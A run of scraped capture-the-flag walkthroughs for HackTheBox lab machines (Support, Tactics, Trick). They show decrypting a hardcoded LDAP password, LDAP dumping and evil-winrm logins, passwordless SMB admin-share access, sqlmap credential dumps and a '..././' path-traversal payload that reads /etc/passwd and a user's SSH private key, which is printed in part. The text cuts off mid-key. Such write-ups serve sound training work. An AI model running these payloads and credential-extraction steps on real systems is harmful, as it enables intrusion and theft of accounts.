UserInfo</li> <li>{} UserInfo.Commands</li> <li>{} UserInfo.Services</li> </ul> <p>In the UserInfo.Services you can find the LdadQuery():</p> <p></p> <pre><code>using System.DirectoryServices;\n\npublic LdapQuery()\n{\n    //IL_0018: Unknown result type (might be due to invalid IL or missing references)\n    //IL_0022: Expected O, but got Unknown\n    //IL_0035: Unknown result type (might be due to invalid IL or missing references)\n    //IL_003f: Expected O, but got Unknown\n    string password = Protected.getPassword();\n    entry = new DirectoryEntry(\"LDAP://support.htb\", \"support\\\\ldap\", password);\n    entry.set_AuthenticationType((AuthenticationTypes)1);\n    ds = new DirectorySearcher(entry);\n}\n</code></pre> <p>From where we stand, we can understand that LdapQuery() function is used to login into the Active Directory with the user \"support\". As a password, it calls the getPassword() function. Let's click on that function in the code to see it:</p> <pre><code>public static string getPassword()\n{\n    byte[] array = Convert.FromBase64String(enc_password);\n    byte[] array2 = array;\n    for (int i = 0; i &lt; array.Length; i++)\n    {\n        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);\n    }\n    return Encoding.Default.GetString(array2);\n}\n</code></pre> <p>Here we can see the necessary steps that we will need to reverse the password if, in the end, we are able to retrieve it. Now, let's click on two function calls: \"enc_password\" and the private function \"key\".</p> <pre><code># enc_password function\n// UserInfo.Services.Protected\nusing System.Text;\n\nprivate static string enc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"\n</code></pre> <pre><code># private static byte[] key\n// UserInfo.Services.Protected\nusing System.Text;\n\nprivate static byte[] key = Encoding.ASCII.GetBytes(\"armando\");\n</code></pre> <p>With these two last elements, we can write a script to reverse the function getPassword() and ultimately obtain the password used for \"support\" user to access the Active Directory.</p> <p>Save the script as script.py and this content:</p> <pre><code>import base64\n\nenc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"\nkey = b'armando'\n\narray = base64.b64decode(enc_password)\narray2 = ''\nfor i in range(len(array)):\n    array2 += chr(array[i] ^ key[i%len(key)] ^ 223)\n\nprint(array2)\n\u00b4\u00b4\u00b4\n\nNow, give script.py execution permissions and run it:\n\n```bash\nchmod +x script.py\npython script.py\n</code></pre> <p>Decrypted password would be: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</p> <p>Before going on, there is another way to get the password besides writing this python script. One of them, for instance, would involve:</p> <ol> <li>Opening a windows machine in the tun0 network range.</li> <li>Opening wireshark and capturing tun0 interface.</li> <li>Running the executable UserInfo.exe from the windows machine.</li> <li>Examining in wireshark the LDAP authentication packet (Follow TCP Stream in a request to port 389).</li> </ol> <p>Summing up, we have:</p> <ul> <li>user: support</li> <li>password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</li> <li>ldap directory: support.htb</li> </ul> <p>Now we can use a tool such as ldapsearch to open a connection to the LDAP server, bind, and perform a search using specified parameters, like:</p> <pre><code>-b searchbase   Use searchbase as the starting point for the search instead of the default.\n-x      Use simple authentication instead of SASL.\n-D binddn   Use the Distinguished Name binddn to bind to the LDAP directory.  For SASL binds, the server is expected to ignore this value.\n-w passwd       Use passwd as the password for simple authentication.\n-H ldapuri  Specify  URI(s)  referring  to  the  ldap  server(s); a list of URI, separated by whitespace or commas is expected\n</code></pre> <p>Using ldapsearch, we run:</p> <pre><code># # ldapsearch -x -H ldap://$ip -D '&lt;DOMAIN&gt;\\&lt;username&gt;' -w '&lt;password&gt;' -b \"CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;\"\n\nldapsearch -x -H ldap://support.htb -D 'support\\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"CN=Users,DC=support,DC=htb\"\n</code></pre> <p>Results are long and provided in text form. By using a tool such as ldapdomaindump we can get cool results in different formats: .grep, .html, and .json.</p> <pre><code> ldapdomaindump -u 'support\\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb\n</code></pre> <p>Then, we can run:</p> <pre><code>firefox domain_users.html\n</code></pre> <p>Results:</p> <p></p> <p>It looks like the support user account has the most permissions. We have a closer look to this user in the results obtained in the ldapsearch:</p> <pre><code># support, Users, support.htb\ndn: CN=support,CN=Users,DC=support,DC=htb\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: support\nc: US\nl: Chapel Hill\nst: NC\npostalCode: 27514\ndistinguishedName: CN=support,CN=Users,DC=support,DC=htb\ninstanceType: 4\nwhenCreated: 20220528111200.0Z\nwhenChanged: 20221109173336.0Z\nuSNCreated: 12617\ninfo: Ironside47pleasure40Watchful\nmemberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb\nmemberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb\nuSNChanged: 81981\ncompany: support\nstreetAddress: Skipper Bowles Dr\nname: support\nobjectGUID:: CqM5MfoxMEWepIBTs5an8Q==\nuserAccountControl: 66048\nbadPwdCount: 0\ncodePage: 0\ncountryCode: 0\nbadPasswordTime: 0\nlastLogoff: 0\nlastLogon: 0\npwdLastSet: 132982099209777070\nprimaryGroupID: 513\nobjectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==\naccountExpires: 9223372036854775807\nlogonCount: 0\nsAMAccountName: support\nsAMAccountType: 805306368\nobjectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb\ndSCorePropagationData: 20220528111201.0Z\ndSCorePropagationData: 16010101000000.0Z\nlastLogonTimestamp: 133124888166969633\n</code></pre> <p>There! Usually, the field \"Info\" is left empty but in this case, you can read: \"Ironside47pleasure40Watchful\", which might be a credential. Assuming that it is, we are going to enumerate user information in AD through the LDAP protocol. And for that, there exists a tool called evil-winrm.</p> <p>What does evil-winrm do? evil-winrm is a WinRM shell for hacking/penthesting purposes.</p> <p>And what is WinRM? WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators. Download evil-winrm repo here.</p> <p>Run:</p> <pre><code>evil-winrm -i dc.support.htb -u support -p \"Ironside47pleasure40Watchful\"\n</code></pre> <p>And we will connect to a powershell terminal: PS C:\\Users\\support\\Documents</p> <p>To get the user.txt flag, run:</p> <pre><code>cd ..\ndir\ncd Desktop\ndir\ntype user.txt\n</code></pre> <p>Result:</p> <pre><code>561ec390613a0f53b431d3e14e923de6\n</code></pre>","tags":["walkthrough"]},{"location":"htb-support/#getting-the-systems-flag","title":"Getting the System's flag","text":"<p>Coming soon.</p>","tags":["walkthrough"]},{"location":"htb-support/#tools-in-this-lab","title":"Tools in this lab","text":"<p>Before going through this write-up, you may have a look at some tools needed to solve it in case you prefer to investigate them and try harder instead of reading directly the solution.</p> <p>kerbrute</p> <p>Created by ropnop. Download repo. A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication.</p> <p>Nicely done in go, so to install it first you need to make sure that go is installed. Otherwise, run:</p> <pre><code>sudo apt update &amp;&amp; sudo apt install golang\n</code></pre> <p>Then, follow the instructions from the repo.</p> <p>enum4linux</p> <p>Preinstalled in a kali machine. Tool to exploit null sessions by using some PERL scripts. Some cool commands here:</p> <pre><code># enumerates shares\nenum4linux -S $ip\n\n# enumerates users\nenum4linux -U $ip\nenum4linux -M $ip     // enumerates machine list\nenum4linux -enuP $ip   // displays the password policy in case you need to mount a network authentification attack\nenum4linux -u $ip     // specify username to use (default \u201c\u201d)\nenum4linux -p $ip    // specify password to use (default \u201c\u201d)\nenum4linux -s /usr/share/enum4linux/share-list.txt $ip    // Also you can use brute force by adding a file\n</code></pre> <p>dnspy</p> <p>Created by a bunch of contributors. Download the repo. dnSpy is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available. There is a but: this tool is for windows</p> <p>To install, open powershell in windows and run:</p> <pre><code>git clone --recursive https://github.com/dnSpy/dnSpy.git\ncd dnsSpy\nbuild.ps1 -NoMbuild\n</code></pre> <p>ILSpy</p> <p>Open source alternative for dnspy. Download from repo; ILSpy. To install ILSpy, you need to install some dependencies like: .NET 6.0 SDK, Avalonia, dotnet... Install what you are asked and when done, run:</p> <pre><code>cd ~/tools/AvaloniaILSpy/artifacts/linux-x64\n./ILSpy\n</code></pre>","tags":["walkthrough"]},{"location":"htb-support/#what-i-learned","title":"What I learned","text":"<p>When doing Support Machine I was faced with some challenging missions:</p> <p>Enumerating shares as part of a Null session attack.</p> <p>A null session attack exploits an authentification vulnerability for Windows Administrative Shares. This lets an attacker connect to a local or remote share without authentification. Therefore, it lets an attacker enumerate precious info such as passwords, system users, system groups, running system processes... The challenge here was to choose the best-suited tools to perform this enumeration. On my mental repo, I had:</p> <ul> <li>Samba suite</li> <li>Enum4linux</li> </ul> <p>But there is also a nmap script for smb enumeration.</p> <p>Finding a .NET decompiler for Linux</p> <p>There are well-known decompilers out there. For windows you have dnSpy and many more. In linux you have the open source ILSpy. BUT: Installation required some dependencies. There were more tools (wine).</p> <p>Ldap enumerating tools</p> <p>ldap-utils are preinstalled in kali, but before this lab, I didn't have had the chance to try them out.</p> <p>ldapsearch</p> <p>Syntax:</p> <pre><code>ldapsearch -x -H ldap://$ip -D '&lt;DOMAIN&gt;\\&lt;username&gt;' -w '&lt;password&gt;' -b \"CN=Users,DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;\"\n</code></pre> <p>An example:</p> <pre><code>ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"CN=Users,DC=SUPPORT,DC=HTB\" | tee ldap_dc.support.htb.txt\n</code></pre> <p>ldapdomaindump</p> <p>I have enjoyed this tool for real! It's pretty straightforward and you get legible results. An example of how to run it:</p> <pre><code>ldapdomaindump -u 'support\\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb\n</code></pre>","tags":["walkthrough"]},{"location":"htb-tactics/","title":"Tactics - A HackTheBox machine","text":"<pre><code>nmap -sC -A 10.129.228.98  -Pn -p-\n</code></pre> <p>Results:</p> <pre><code>PORT    STATE SERVICE       VERSION\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -5s\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 7476/tcp): CLEAN (Timeout)\n|   Check 2 (port 63095/tcp): CLEAN (Timeout)\n|   Check 3 (port 16465/udp): CLEAN (Timeout)\n|   Check 4 (port 43695/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2023-05-02T10:26:04\n|_  start_date: N/A\n</code></pre> <p>Interesting part here is </p> <pre><code>smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n</code></pre> <p>This will allow us to use smbclient share enumeration withouth the need of providing a password when signing into the shared folder. For that we will use a well known user in Windows: Administrator.</p> <pre><code>smbclient -L 10.129.228.98 -U Administrator\n</code></pre> <p>Results:</p> <pre><code>        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n</code></pre> <pre><code>smbclient \\\\\\\\10.129.228.98\\\\C$ -U Administrator\n</code></pre> <p>Flag is located at: </p> <pre><code>\\Users\\Administrator\\Desktop\\&gt;flag.txt \n</code></pre>","tags":["walkthrough","windows","smb","port 445"]},{"location":"htb-trick/","title":"Walkthrough - Trick, a Hack The Box machine","text":"","tags":["walkthrough"]},{"location":"htb-trick/#about-the-machine","title":"About the machine","text":"data Machine Trick Platform Hackthebox url link creator Geiseric OS Linux Release data 18 June 2022 Difficulty Easy Points 20 ip 10.10.11.166","tags":["walkthrough"]},{"location":"htb-trick/#recon","title":"Recon","text":"<p>First, we run:</p> <pre><code>export ip=10.10.11.166\n</code></pre>","tags":["walkthrough"]},{"location":"htb-trick/#service-port-enumeration","title":"Service/ Port enumeration","text":"<p>Run nmap to enumerate open ports, services, OS and traceroute</p> <p>General enumeration not to make too much noise:</p> <pre><code>sudo nmap $ip -Pn\n</code></pre> <p>Results:</p> <pre><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-19 13:31 EDT\nNmap scan report for trick.htb (10.10.11.166)\nHost is up (0.15s latency).\nNot shown: 996 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n25/tcp open  smtp\n53/tcp open  domain\n80/tcp open  http\n</code></pre> <p>Once you know open ports, run nmap to see service versions and more details:   </p> <pre><code>nmap -sCV -p22,80,53,25 -oN targeted $ip\n</code></pre> <p>Results:</p> <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)\n|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)\n|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)\n25/tcp open  smtp    Postfix smtpd\n|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING\n53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)\n| dns-nsid:\n|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian\n80/tcp open  http    nginx 1.14.2\n|_http-title: Coming Soon - Start Bootstrap Theme\n|_http-server-header: nginx/1.14.2\nService Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>","tags":["walkthrough"]},{"location":"htb-trick/#directory-enumeration","title":"Directory enumeration","text":"<p>We can use gobuster to enumerate directories:</p> <pre><code>gobuster dir -u $ip -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n</code></pre>","tags":["walkthrough"]},{"location":"htb-trick/#dns-enumeration","title":"dns enumeration","text":"<p>Run:</p> <pre><code>dnslookup\n</code></pre> <p>And after that:</p> <pre><code>&gt; SERVER 10.10.11.166\n</code></pre> <p>Results:</p> <pre><code>Default server: 10.10.11.166\nAddress: 10.10.11.166#53\n</code></pre> <p>Then, we run:</p> <pre><code>&gt; 10.10.11.166\n</code></pre> <p>And as a result, we have:</p> <pre><code>166.11.10.10.in-addr.arpa       name = trick.htb.\n</code></pre> <p>Now we have a dns name: trick.htb. We can dig it with:</p> <pre><code>dig trick.htb axfr @10.10.11.166\n</code></pre> <p>And the results:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.6-2-Debian &lt;&lt;&gt;&gt; trick.htb axfr @10.10.11.166\n;; global options: +cmd\ntrick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800\ntrick.htb.              604800  IN      NS      trick.htb.\ntrick.htb.              604800  IN      A       127.0.0.1\ntrick.htb.              604800  IN      AAAA    ::1\npreprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.\ntrick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800\n;; Query time: 96 msec\n;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)\n;; WHEN: Wed Oct 19 13:20:24 EDT 2022\n;; XFR size: 6 records (messages 1, bytes 231)\n</code></pre> <p>Finally we have these dns domains: + trick.htb + preprod-payroll.trick.htb + root.trick.htb</p>","tags":["walkthrough"]},{"location":"htb-trick/#edit-etchosts-file","title":"Edit /etc/hosts file","text":"<p>We add the given subdomain to our /etc/hosts file. First we open the /etc/hosts file with an editor. For instance, nano.</p> <p><pre><code>sudo nano /etc/hosts\n</code></pre> We move the cursor to the end and we add these lines:</p> <pre><code>10.10.11.166    trick.htb\n10.10.11.166    preprod-payroll.trick.htb\n10.10.11.166    root.trick.htb\n</code></pre> <p>Now we can use the browser to go to: http://preprod-payroll.trick.htb</p> <p>And start again with directory enumeration.</p>","tags":["walkthrough"]},{"location":"htb-trick/#directory-enumeration_1","title":"Directory enumeration","text":"<p>Run the dictionary:</p> <pre><code>gobuster dir -u http://preprod-payroll.trick.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n</code></pre> <p>Results:</p> <pre><code>Dirs found with a 302 response:\n\n/\n\nDirs found with a 403 response:\n\n/assets/\n/database/\n/assets/vendor/\n/assets/img/\n/assets/vendor/jquery/\n/assets/DataTables/\n/assets/vendor/bootstrap/\n/assets/vendor/bootstrap/js/\n/assets/vendor/jquery.easing/\n/assets/css/\n/assets/vendor/php-email-form/\n/assets/vendor/venobox/\n/assets/vendor/waypoints/\n/assets/vendor/counterup/\n/assets/vendor/owl.carousel/\n/assets/vendor/bootstrap-datepicker/\n/assets/vendor/bootstrap-datepicker/js/\n/assets/js/\n/assets/font-awesome/\n/assets/font-awesome/js/\n/assets/vendor/owl.carousel/assets/\n/assets/vendor/bootstrap/css/\n/assets/vendor/bootstrap-datepicker/css/\n/assets/font-awesome/css/\n/assets/vendor/bootstrap-datepicker/locales/\n/assets/font-awesome/less/\n\n\n--------------------------------\nFiles found during testing:\n\nFiles found with a 302 responce:\n\n/index.php\n\nFiles found with a 200 responce:\n\n/login.php\n/home.php\n/header.php\n/users.php\n/ajax.php\n/navbar.php\n/assets/vendor/jquery/jquery.min.js\n/assets/DataTables/datatables.min.js\n/assets/vendor/bootstrap/js/bootstrap.bundle.min.js\n/assets/vendor/jquery.easing/jquery.easing.min.js\n/assets/vendor/php-email-form/validate.js\n/assets/vendor/venobox/venobox.min.js\n/assets/vendor/waypoints/jquery.waypoints.min.js\n/assets/vendor/counterup/counterup.min.js\n/assets/vendor/owl.carousel/owl.carousel.min.js\n/assets/js/select2.min.js\n/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.min.js\n/assets/js/jquery.datetimepicker.full.min.js\n/assets/js/jquery-te-1.4.0.min.js\n/assets/font-awesome/js/all.min.js\n/department.php\n/topbar.php\n/position.php\n/employee.php\n/payroll.php\n</code></pre> <p>In http://preprod-payroll.trick.htb/users.php there is this info:</p> <pre><code>name: Administrator\nusername: Enemigosss\n</code></pre>","tags":["walkthrough"]},{"location":"htb-trick/#exploiting-a-sql-injection-vulnerability","title":"Exploiting a sql injection vulnerability","text":"<p>If we have a look at the forms at http://preprod-payroll.trick.htb/login.php and run sqlmap, we'll see that it is vulnerable to SQL injection - Blind.</p> <p>We can extract databases:</p> <pre><code>sqlmap -r login --dbs\n</code></pre> <p>Results:</p> <pre><code>available databases [2]:\n[*] information_schema\n[*] payroll_db\n</code></pre> <p>Now, we extract tables from payroll_db database:</p> <pre><code>sqlmap -r login -D payroll_db --tables\n</code></pre> <p>Results:</p> <pre><code>Database: payroll_db\n[11 tables]\n+---------------------+\n| position            |\n| allowances          |\n| attendance          |\n| deductions          |\n| department          |\n| employee            |\n| employee_allowances |\n| employee_deductions |\n| payroll             |\n| payroll_items       |\n| users               |\n+---------------------+\n</code></pre> <p>Next, we get columns from the users table:</p> <pre><code>sqlmap -r login -D payroll_db -T users --columns\n</code></pre> <p>Results:</p> <pre><code>Database: payroll_db\nTable: users\n[8 columns]\n+-----------+--------------+\n| Column    | Type         |\n+-----------+--------------+\n| address   | text         |\n| contact   | text         |\n| doctor_id | int(30)      |\n| id        | int(30)      |\n| name      | varchar(200) |\n| password  | varchar(200) |\n| type      | tinyint(1)   |\n| username  | varchar(100) |\n+-----------+--------------+\n</code></pre> <p>And finally we can get usernames and passwords:</p> <pre><code>sqlmap -r login -D payroll_db -T users -C username,password --dump\n</code></pre> <p>Results:</p> <pre><code>Database: payroll_db\nTable: users\n[1 entry]\n+------------+-----------------------+\n| username   | password              |\n+------------+-----------------------+\n| Enemigosss | SuperGucciRainbowCake |\n+------------+-----------------------+\n</code></pre> <p>We can login at http://preprod-payroll.trick.htb and see an administration pannel, but other than information disclosure, we cannot find a vuln to get into the server.</p>","tags":["walkthrough"]},{"location":"htb-trick/#dns-fuzzing","title":"DNS fuzzing","text":"<p>Since the subdomain name (http://preprod-payroll.trick.htb/) looks interesting as \u201cpayroll\u201d can be replaced with another word, we can consider fuzzing it. Firstly, we will need to figure out the non-existence subdomain query\u2019s error response size. Then we fuzz for a subdomain.</p> <pre><code>curl -s -H \"Host: nonexistent.trick.htb\" https://trick.htb | wc -c\n</code></pre> <p>And it returns 5480, which is the filter that we will use in th ffuz command.</p> <p>Now we can keep on enumerating subdomains with ffuz:</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000-trick.txt -u http://trick.htb -H \u201cHost: FUZZ.trick.htb\u201d -fs 5480\n</code></pre> <p>If we add -fs 5480 to the command this will filter out the responses that are 5480 bytes in length (which are non-existent subdomains) and we can pinpoint what is a real finding.</p> <pre><code>ffuf -H \"Host: preprod-FUZZ.trick.htb\" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.166 -fs 5480\n</code></pre> <p>Adding the filter reveals a new subdomain called preprod-marketing. Results:</p> <pre><code>        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.166\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt\n :: Header           : Host: preprod-FUZZ.trick.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n :: Filter           : Response size: 5480\n________________________________________________\n\nmarketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 267ms]\npc169                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 212ms]\npayroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 116ms]\n77msccom                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms\n</code></pre>","tags":["walkthrough"]},{"location":"htb-trick/#edit-etchosts-file_1","title":"Edit /etc/hosts file","text":"<p>We add the given subdomain to our /etc/hosts file. First we open the /etc/hosts file with an editor. For instance, nano.</p> <pre><code>sudo nano /etc/hosts\n</code></pre> <p>We move the cursor to the end and we add these lines:</p> <pre><code>10.10.11.166    preprod-marketing.trick.htb\n</code></pre> <p>We introduce the address into the browser and we can see a website. In one of the pages there is a path traversal vulnerability:</p> <pre><code>http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/passwd\n</code></pre> <p>Results:</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\ntss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false\ndnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nrtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin\npulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\nspeech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false\navahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\nsaned:x:112:121::/var/lib/saned:/usr/sbin/nologin\ncolord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\ngeoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin\nhplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false\nDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false\nsshd:x:118:65534::/run/sshd:/usr/sbin/nologin\npostfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin\nbind:x:120:128::/var/cache/bind:/usr/sbin/nologin\nmichael:x:1001:1001::/home/michael:/bin/bash\n</code></pre> <p>Now, we can infer somehow that in /home/michael we can find a .ssh folder with teh id_rsa public ssh signature. To download it, we can use burp and capture this petition:</p> <pre><code>http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa\n</code></pre> <p>As a result, we can download michael's public key to login via ssh:</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.14.2\nDate: Thu, 20 Oct 2022 08:25:41 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nContent-Length: 1823\n\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz\nc4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G\nYQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+\n4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/\nUkn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4\n1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC\nDkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0\n+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE\nhkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L\njnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6\nIqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C\naUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/\nKwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC\ntnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge\nU+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0\nfHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V\nPH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS\n3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA\nfvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT\nAuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn\nIn16n3kMFSFaU2